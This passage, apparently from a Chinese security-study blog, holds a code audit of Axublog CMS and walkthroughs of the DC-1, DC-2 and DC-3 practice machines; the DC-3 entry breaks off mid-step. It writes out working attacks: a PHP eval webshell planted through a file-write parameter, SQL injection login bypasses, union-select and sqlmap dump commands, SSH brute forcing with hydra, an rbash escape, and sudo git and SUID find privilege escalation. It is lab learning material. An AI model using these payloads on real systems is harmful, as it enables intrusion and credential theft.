<h3 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p>
<h5 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>分析漏洞代码：</p>
<pre><code>&lt;?php
@$g=$_GET[&quot;g&quot;];
?&gt;
&lt;script src=&quot;jspost.js&quot;&gt;&lt;/script&gt; 
&lt;/head&gt;
&lt;body&gt;
&lt;?php
    switch ($g)
    {
    default:index();break; 
    case &quot;index&quot;:index();break; 
    case &quot;savechoose&quot;:savechoose();break; 
    case &quot;edit&quot;:edit();break; 
        case &quot;edit2&quot;:edit2();break; 
        case &quot;edit2save&quot;:edit2save();break; 
    }</code></pre><p>当我们传入<code>?g=edit2save</code>即可调用edit2save()的函数。</p>
<p>我们继续观察该函数功能：</p>
<pre><code>&lt;?php 
function edit2save(){
global $themepath;
?&gt;
&lt;div class=&quot;yj_green&quot; id=full&gt;
&lt;b class=&quot;b1&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b4&quot;&gt;&lt;/b&gt;
&lt;div class=&quot;boxcontent&quot;&gt;
&lt;h2&gt;&lt;a href=&quot;?&quot;&gt;主题管理&lt;/a&gt; &gt; &lt;a href=&quot;javascript:history.go(-2)&quot;&gt;编辑主题&lt;/a&gt; &gt; 编辑文件 &gt; &lt;a href=&quot;javascript:history.back()&quot;&gt;返回&lt;/a&gt;&lt;/h2&gt;
&lt;/div&gt;
&lt;div class=&quot;t1&quot;&gt;&lt;div class=&quot;t2&quot;&gt;
&lt;?php
$path=$_REQUEST[&#39;path&#39;];
$content=stripslashes($_REQUEST[&#39;content&#39;]);
?&gt;
&lt;p&gt;编辑文件：&lt;?=$path?&gt;&lt;/p&gt;
&lt;?php
if($path==&#39;&#39;){echo&#39;文件路径错误！&#39;;exit;}

if(file_put_contents ($path, $content)){echo&quot;保存文件成功！&quot;;} 
else{echo&quot;保存文件失败！&quot;;}
?&gt;</code></pre><p>​    在这个方法中，$path和$content分别表示路径和文件内容，用户可控，最后把这两个参数传入file_put_contents中进行保存操作。</p>
<p>我们可以构造写入webshell的payload:</p>
<pre><code>?g=edit2save&amp;path=../shell.php&amp;content=&lt;?php%20@eval($_POST[cmd]);?&gt;</code></pre><p>成功拿到webshell.</p>
<h5 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h5><p>我们根据上下函数可知，此处调用该函数的目的是为了about页面：</p>
<p>所以我们可以对path进行白名单校验，或者直接将路径写死：</p>
<pre><code>if($path!=&#39;../theme/default/about.mb&#39;){
    echo &#39;about.mb地址不正确&#39;;
    exit;
}</code></pre><h3 id="后台生成about页面getshell"><a href="#后台生成about页面getshell" class="headerlink" title="后台生成about页面getshell"></a>后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p>
<h5 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><pre><code>ob_start();
include($mb);
$html = ob_get_contents ();
ob_clean();
$html=mbreplace($html);
file_put_contents ($cache, $html);

echo &#39;生成about.html成功: &lt;a target=blank href=&quot;&#39;.$cache.&#39;&quot;&gt;访问&lt;/a&gt;&#39;;
?&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;b class=&quot;b4b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b1b&quot;&gt;&lt;/b&gt;
&lt;/div&gt;
&lt;?php
}
?&gt;</code></pre><p>这里使用include函数包含about.mb将其中php的语句执行后再将一些标签替换成变量的值，最后把处理的结果放入<code>$cache</code>变量中再将其写入<code>aout.html</code>页面。</p>
<p>我们在about.mb尾部添加如下代码：</p>
<pre><code>&lt;?php 
file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php @eval($_GET[&quot;a&quot;]); ?&gt;&#39;); 
?&gt;</code></pre><p>然后使用菜刀连接即可getshell。</p>
<h4 id="后台登录处的sql注入漏洞"><a href="#后台登录处的sql注入漏洞" class="headerlink" title="后台登录处的sql注入漏洞"></a>后台登录处的sql注入漏洞</h4><h5 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p>
<p><img src="1587018-20200303210401433-2074327058.png" alt=""></p>
<p>打开c_login.php页面，分析jsloginpost代码，发现jsloginpost并没有对user和psw进行过滤处理，而是直接带入了sql语句进行查询，所以此处造成了sql注入漏洞。</p>
<p><img src="1587018-20200303211200124-595595133%5B1%5D.png" alt=""></p>
<h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p>
<pre><code>user:admin&#39; or 1=1#
psw: 随意
或者
user: admin&#39; or 1#
psw: 随意</code></pre><p><img src="1587018-20200303211645255-577074129%5B1%5D.png" alt=""></p>
<h4 id="前台反射型xss漏洞"><a href="#前台反射型xss漏洞" class="headerlink" title="前台反射型xss漏洞"></a>前台反射型xss漏洞</h4><h5 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p>
<p><img src="1587018-20200303232615102-565416911%5B1%5D.png" alt=""></p>
<p>进入so()函数继续分析：在so()函数中也没有对word参数进行任何过滤处理，而是包含了一个模板文件search.mb，继续跟进模板文件：</p>
<p><img src="1587018-20200303234054140-229902481%5B1%5D.png" alt=""></p>
<p><img src="1587018-20200303233948167-467235758%5B1%5D.png" alt=""></p>
<p>模板文件search.mb分析：发现在模板文件中也是直接对word参数直接输出，而没有任何过滤，所以此处就造成了xss漏洞</p>
<p><img src="1587018-20200303234320733-213715566%5B1%5D.png" alt=""></p>
<h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p><img src="1587018-20200303234506377-737313316.png" alt="img"></p>
<h4 id="前台sql注入漏洞"><a href="#前台sql注入漏洞" class="headerlink" title="前台sql注入漏洞"></a>前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p>
<p><img src="1587018-20200303234835707-2141296773.png" alt="img"></p>
<p>发现在searchlist()函数中同样没有对word参数进行过滤，而直接带入了sql语句进行查询，所以此处就造成了sql注入漏洞。</p>
<p>漏洞利用：</p>
<pre><code>执行如下poc时候返回正确结果：
http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=1--+
执行如下poc时候无结果返回：
http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=2--+</code></pre><h4 id="后台任意文件写入漏洞"><a href="#后台任意文件写入漏洞" class="headerlink" title="后台任意文件写入漏洞"></a>后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p>
<p>漏洞点：admin/theme.php</p>
<p><img src="1587018-20200304002821492-309441952.png" alt=""></p>
<p>edit2save()函数进行了文件的写入操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。</p>
<p>继续寻找edit2save()函数调用点：发现当g=edit2save时调用该函数。</p>
<p><img src="1587018-20200304003116729-1307171520.png" alt="img"></p>
<h5 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>请求：
http://192.168.110.152/axublog/admin/theme.php?g=edit2save

post:
path=./shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre><p><img src="1587018-20200304003256803-1334544380.png" alt="img"></p>
<h4 id="后台多个sql注入漏洞"><a href="#后台多个sql注入漏洞" class="headerlink" title="后台多个sql注入漏洞"></a>后台多个sql注入漏洞</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点：admin/admin.php</p>
<p>定位edit()函数，发现id参数没有经过过滤而直接带入sql语句进行查询了。</p>
<p><img src="1587018-20200304172222897-1426655107.png" alt="img"></p>
<p>但是这里在获取id参数之前调用了chkoutpost()函数进行验证。跟进chkoutpost()函数。class/c_other.php</p>
<p><img src="1587018-20200304172533350-1121177041.png" alt="img"></p>
<p>chkoutpost()函数仅仅验证了refer是否为空的情况，所以我们在利用这个sql注入漏洞是时候给refer随便赋个值即可。</p>
<p>查看edit函数在哪里被调用了：发现当g=edit时候调用edit函数。</p>
<p><img src="1587018-20200304172752867-937007122.png" alt="img"></p>
<h5 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>poc:
http://192.168.110.152/axublog/admin/admin.php?g=edit&amp;id=1 union select 1,version(),3,4--+

Referer: 任意填写</code></pre><p><img src="1587018-20200304172922428-724640530.png" alt="img"></p>
<p>6，既然这个cms的sql注入都没有进行防御，那么肯定还存在n个sql注入漏洞，此处就不一一说明了。</p>
<h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p>
<p>首先定位到edit2()函数，在edit2函数中通过调用file_get_contents函数获取变量path文件中的内容，然而变量path文件中的内容，然而变量path的值是通过request的方式从path参数获取的，并且对变量$path没有任何过滤而直接带入到file_get_contents函数进行获取文件内容，所以此处就造成了任意文件读取漏洞。</p>
<p><img src="1587018-20200304173840167-1365630191.png" alt="img"></p>
<p>跟进edit2()函数，寻找调用方法：当g=edit2的时候调用edit2函数。</p>
<p><img src="1587018-20200304174437952-1224821444.png" alt="img"></p>
<p>漏洞利用：</p>
<pre><code>poc:
http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></pre><p><img src="1587018-20200304174618584-506013891.png" alt=""></p>
<h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><p>漏洞点：admin/html.php</p>
<p>漏洞分析：在生成about页面的时候调用了ob_get_contents函数执行about.mb里面的php代码，并且没有进行任何过滤，所以我们可以通过向about.md文件中写入php代码，从而使其被执行。然而在后台管理页面中正好有编辑about页功能。</p>
<p><img src="1587018-20200304210913536-1220729563.png" alt="img"></p>
<p>漏洞利用：</p>
<p>首先编辑about页，然后向其中写入想要执行的php代码即可，此处我使用file_put_contents函数生成一个文件名为shell2.php的探针文件。</p>
<p><img src="1587018-20200304211607584-434322337.png" alt="img"></p>
<p>保存编辑后选择生成about：</p>
<p><img src="1587018-20200304211905560-277463672.png" alt="img"></p>
<p>然后我们的代码就被成功的执行了，访问shell2.php:</p>
<p><img src="1587018-20200304212324112-1387100175.png" alt="img"></p>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p>
<p><a href="https://blog.csdn.net/sweet0swat/article/details/89056383" target="_blank" rel="noopener">https://blog.csdn.net/sweet0swat/article/details/89056383</a></p>
]]></content>
      <categories>
        <category>代码审计学习</category>
      </categories>
      <tags>
        <tag>Axublog</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2靶机学习</title>
    <url>/2020/04/03/dc-2-ba-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="DC-2靶机测试"><a href="#DC-2靶机测试" class="headerlink" title="DC-2靶机测试"></a>DC-2靶机测试</h2><p>[TOC]</p>
<h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205133827.png" alt=""></p>
<p>我们使用netdiscover进行主机发现。</p>
<pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205102253.png" alt=""></p>
<p>确定了靶机IP为192.168.153.136</p>
<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用nmap 进行信息收集</p>
<pre><code>nmap -A -p 1-65535 192.168.153.136 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111215.png" alt=""></p>
<p>我们发现靶机上开放着80端口，并且部署了apache服务器，7744开启了SSH服务。提示是一个wordpress站点</p>
<p>我们需要首先在host文件下添加<a href="http://dc-2/域名，然后使用浏览器去访问该域名。" target="_blank" rel="noopener">http://dc-2/域名，然后使用浏览器去访问该域名。</a></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205111308.png" alt=""></p>
<p>我们使用Wappalyzer进行指纹识别。确定了是一个WordPress的站点。</p>
<h4 id="第三步、使用Wpscan扫描"><a href="#第三步、使用Wpscan扫描" class="headerlink" title="第三步、使用Wpscan扫描"></a>第三步、使用Wpscan扫描</h4><p>​       该扫描器可以实现获取<code>Wordpress</code>站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p>
<p>我们使用命令扫描网站内的用户名</p>
<pre><code>wpscan --url dc-2 -e u</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132051.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132034.png" alt=""></p>
<p>获取到用户名后，我们思考能否爆破密码。</p>
<p>我们首先使用crel收集网页的信息</p>
<p>​    Cewl：CeWL是一款以爬虫模式在指定URL上收集单词的工具，可以将它收集到的单词纳入密码字典，以提高密码破解工具的成功率。</p>
<pre><code>cewl dc-2 -w dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111938.png" alt=""></p>
<p>得到密码字典后我们继续回到wpscan进行密码爆破、</p>
<pre><code>wpscan --url dc-2 -P dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132515.png" alt=""></p>
<p>我们得到了两个登录的账号和密码。</p>
<h4 id="第四步、登录后台"><a href="#第四步、登录后台" class="headerlink" title="第四步、登录后台"></a>第四步、登录后台</h4><p>我们通过wpscan发现了默认的后台登录页面。（wp-login.php)</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132755.png" alt=""></p>
<p>我们使用jerry用户进行登录。在其账号中发现了flag2.txt的信息。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132930.png" alt=""></p>
<p>我们翻译一下：</p>
<p>如果你不能利用WordPress并抄近路，还有别的办法。           </p>
<p>   希望你能找到另一个切入点。</p>
<h4 id="第五步、登录ssh"><a href="#第五步、登录ssh" class="headerlink" title="第五步、登录ssh"></a>第五步、登录ssh</h4><pre><code> 我们尝试使用上面两个账户来登陆ssh。首先尝试tom的账户。</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200217113658.png" alt=""></p>
<p>可以登陆，ls一下可以看到flag3。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200217113757.png" alt=""></p>
<p>​    但是登陆使用的shell是rBash，功能受到严重限制以至于cat命令都无法使用，所以需要想办法绕过限制。我们先尝试把shell切换为/bin/sh，成功了。继续尝试使用cat来查看flag3中的内容，提示不能找到命令，这时候原因应该是没有将cat命令的目录添加到$PATH中，于是添加之。然后使用cat查看flag3.txt中的内容。<br>rBash和sh shell命令</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205115512.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205115956.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120014.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120104.png" alt=""></p>
<h4 id="第六步、Git提权获得最终flag"><a href="#第六步、Git提权获得最终flag" class="headerlink" title="第六步、Git提权获得最终flag"></a>第六步、Git提权获得最终flag</h4><p>我们先切换到jerry用户，在jerry的家目录下找到flag4.txt</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120330.png" alt=""></p>
<p>flag4 提示我们可以使用git，我们可以通过git来提权</p>
<p>sudo -l 我们可以看到无需root权限，jerry 可以使用 git ！</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123533.png" alt=""></p>
<p>我们可以利用suid 进行提权</p>
<p>SUID可以让调用者以文件拥有者的身份运行该文件</p>
<pre><code>sudo git -p --help</code></pre><p>输入!/bin/bash 获得root权限</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123719.png" alt=""></p>
<p>我们在root目录下找到最后一个flag。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123829.png" alt=""></p>
]]></content>
      <categories>
        <category>靶机学习</category>
      </categories>
      <tags>
        <tag>DC-2靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1靶机学习</title>
    <url>/2020/04/03/dc-1-ba-ji-xue-xi/</url>
    <content><![CDATA[<h2 id="DC-1靶机学习"><a href="#DC-1靶机学习" class="headerlink" title="DC-1靶机学习"></a>DC-1靶机学习</h2><h4 id="第一步、搭建dc-1和kali虚拟机，使用-nat模式"><a href="#第一步、搭建dc-1和kali虚拟机，使用-nat模式" class="headerlink" title="第一步、搭建dc-1和kali虚拟机，使用.nat模式"></a>第一步、搭建dc-1和kali虚拟机，使用.nat模式</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200204102843.png" alt=""></p>
<p>我们进入DC-1的登录界面，然后回到kali攻击机准备入侵。</p>
<h4 id="第二步、扫描出靶机的ip地址"><a href="#第二步、扫描出靶机的ip地址" class="headerlink" title="第二步、扫描出靶机的ip地址"></a>第二步、扫描出靶机的ip地址</h4><p>1.我们可以使用nmap进行二层的主机发现</p>
<p><code>nmap -sn 192.168.153.0/24</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204103154.png" alt=""></p>
<p>2.使用netdiscover进行主机发现</p>
<p><code>netdiscover -i eth0 -r 192.168.153.0/24</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204114216.png" alt=""></p>
<p>3.使用arp-scan进行主机发现</p>
<p><code>arp-scan -l</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204114720.png" alt=""></p>
<h4 id="第三步、靶机的信息收集"><a href="#第三步、靶机的信息收集" class="headerlink" title="第三步、靶机的信息收集"></a>第三步、靶机的信息收集</h4><p>我们使用nmap对该靶机进行扫描。</p>
<pre><code>nmap -A -p 1-65535 192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204103823.png" alt=""></p>
<p>我们发现开放的80(tcp) 22（ssh) 111(tcp)端口，并且可以看出使用的CMS为Drupal7。</p>
<p>我们从浏览器访问该IP的80页面</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104045.png" alt=""></p>
<p>我们使用Wappalyzer进行网站的指纹识别，得到更详细的信息。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204115356.png" alt=""></p>
<h4 id="第四步、使用msf入侵目标系统"><a href="#第四步、使用msf入侵目标系统" class="headerlink" title="第四步、使用msf入侵目标系统"></a>第四步、使用msf入侵目标系统</h4><p>进入msf控制台，使用search命令查找关于Drupal的历史漏洞。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104359.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104445.png" alt=""></p>
<p>我们选择极好等级的并且日期较近的漏洞进行利用，可以提高成功概率。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204104853.png" alt=""></p>
<p>我们使用set命令设置目标机器，使用run或exploit命令开始攻击。</p>
<p>看到出现meterpreter证明成功入侵系统。</p>
<h4 id="第五步、获取flag-1"><a href="#第五步、获取flag-1" class="headerlink" title="第五步、获取flag 1"></a>第五步、获取flag 1</h4><p>我们执行shell命令获得shell.</p>
<p>ls后发现目录下存在flag1.txt.</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204105001.png" alt=""></p>
<p>我们cat flag1.txt读取内容。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204105042.png" alt=""></p>
<p>翻译：每一个好的CMS都需要一个配置文件，你也一样。</p>
<h4 id="第六步、获取flag2-txt"><a href="#第六步、获取flag2-txt" class="headerlink" title="第六步、获取flag2.txt"></a>第六步、获取flag2.txt</h4><p>我们通过百度查询到该cms的配置文件 ：/var/www/sites/default</p>
<p>我们使用cd命令切换到该目录，读取目录下的setting.php文件。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110426.png" alt=""></p>
<p>我们找到了flag2.txt并读取内容。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110442.png" alt=""></p>
<p>翻译：暴力和字典攻击不是获取访问权限的唯一方式。并且将需要访问权限。并且给出了mysql数据库的账号和密码。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204110617.png" alt=""></p>
<h4 id="第七步、获取flag4-txt"><a href="#第七步、获取flag4-txt" class="headerlink" title="第七步、获取flag4.txt"></a>第七步、获取flag4.txt</h4><p>我们可以先看一下/etc/passwd中的内容，意外发现了flag4的账号名</p>
<p>/etc/passwd 储存了用户重要信息，一般可读但不可写</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204115756.png" alt=""></p>
<p>我们尝试使用john+hydra进行暴力破解。</p>
<pre><code>hydra -l flag4 -p/Users/john-1.8.0/run/password.lst ssh://192.168.153.150</code></pre><p>-l 指定用户名<br> -P 加载密码字典（这里使用了John the Ripper安装后提供的密码本，一般在john-1.8.0/run/password.lst)<br> ssh://ip 指定使用协议和ip地址</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204120356.png" alt=""></p>
<p>得到了flag4账号对应的密码为orange</p>
<p>我们使用kali ssh远程登录 </p>
<pre><code>ssh flag4@192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204120529.png" alt=""></p>
<p>ls后发现flag4.txt文件，尝试cat读取。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204121509.png" alt=""></p>
<p>翻译:您可以使用相同的方法在根目录中查找或访问标志吗?可能。但也许不是那么容易。或许是这样？</p>
<p>可能我们需要提权。</p>
<h4 id="第八步、获得-thefinalflag-txt"><a href="#第八步、获得-thefinalflag-txt" class="headerlink" title="第八步、获得 thefinalflag.txt"></a>第八步、获得 thefinalflag.txt</h4><p>由flag3.txt可知，我们需要获取root权限才能读取最终的flag</p>
<p>由于对提取部分知识不够，参考别人的教程要利用suid提权</p>
<p>suid是Linux的一个权限机制，在执行使用suid权限的文件时候，调用者会暂时有该文件的root权限。</p>
<p>首先我们使用<code>find / -perm -4000 2&gt;/dev/null</code>发现系统上运行的所有SUID可执行文件。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204122116.png" alt=""></p>
<p>发现find命令被设置为suid权限位</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200204122420.png" alt=""></p>
<p>之后我们通过find命令提权，使用whoami查看用户权限。</p>
<p>之后进入 root目录下查看最终的flag.</p>
<p><strong>完</strong></p>
]]></content>
      <categories>
        <category>靶机学习</category>
      </categories>
      <tags>
        <tag>DC-1靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3靶机</title>
    <url>/2020/03/12/dc-3-ba-ji/</url>
    <content><![CDATA[<h2 id="DC-3靶机学习"><a href="#DC-3靶机学习" class="headerlink" title="DC-3靶机学习"></a>DC-3靶机学习</h2><h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p>
<p>使用nmap进行二层主机发现</p>
<pre><code>nmap -sn 192.168.153.1/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt=""></p>
<h4 id="第二步、端口扫描与信息收集"><a href="#第二步、端口扫描与信息收集" class="headerlink" title="第二步、端口扫描与信息收集"></a>第二步、端口扫描与信息收集</h4><p>使用nmap进行简单的系统版本检测扫描。</p>
<pre><code>nmap -sV 192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt=""></p>
<p>发现80端口开放且运行Apache服务。</p>
<p>我们网页访问IP的80端口</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt=""></p>
<p>使用Wappalyzer进行指纹识别，发现使用的Joomla系统建站。</p>
<h4 id="第三步、joomscan扫描"><a href="#第三步、joomscan扫描" class="headerlink" title="第三步、joomscan扫描"></a>第三步、joomscan扫描</h4><p>​        OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告</p>
<pre><code>  不知道为什么，我的kali里好像没有这个工具。。。</code></pre><p>我们从github上根据教程安装下载后。使用命令检测joomla的相关配置</p>
<pre><code>perl joomscan.pl -u http://192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt=""></p>
<p>我们得到了该Joomla的具体版本号为3.7.0.</p>
<h4 id="第四步、searchsploit工具查找漏洞"><a href="#第四步、searchsploit工具查找漏洞" class="headerlink" title="第四步、searchsploit工具查找漏洞"></a>第四步、searchsploit工具查找漏洞</h4><p>使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt=""></p>
<p>发现存在一个sql注入漏洞。</p>
<p>我们将该漏洞文档复制到根目录下，然后打开。</p>
<pre><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla-sql.txt
cat joomla-sql.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt=""></p>
<p>文档中给出了sqlmap自动注入的payload.</p>
<h4 id="第五步、sqlmap自动注入"><a href="#第五步、sqlmap自动注入" class="headerlink" title="第五步、sqlmap自动注入"></a>第五步、sqlmap自动注入</h4><p>使用sqlmap自动注入工具对靶机执行sql注入代码。</p>
<ul>
<li>查询所有数据库：</li>
</ul>
<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt=""></p>
<p>查询当前使用数据库：</p>
<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]
</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt=""></p>
<p>查询joomladb数据库下的表：</p>
<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt=""></p>
<p>我们判断users表中应该有我们想要的账号密码，查询该表中的列：</p>
<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt=""></p>
<p>最后我们输出name,password的信息：</p>
<pre><code>sqlmap  -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt=""></p>
<h4 id="第六步、后台反弹getshell"><a href="#第六步、后台反弹getshell" class="headerlink" title="第六步、后台反弹getshell"></a>第六步、后台反弹getshell</h4><p>我们首先利用使用john爆破hash值：snoopy</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt=""></p>
<p>使用dirsearch扫出后台文件</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt=""></p>
<p>进入后台登录页面并登录</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt=""></p>
<p>选择Templates模板，选择templates第一个模板即可，</p>
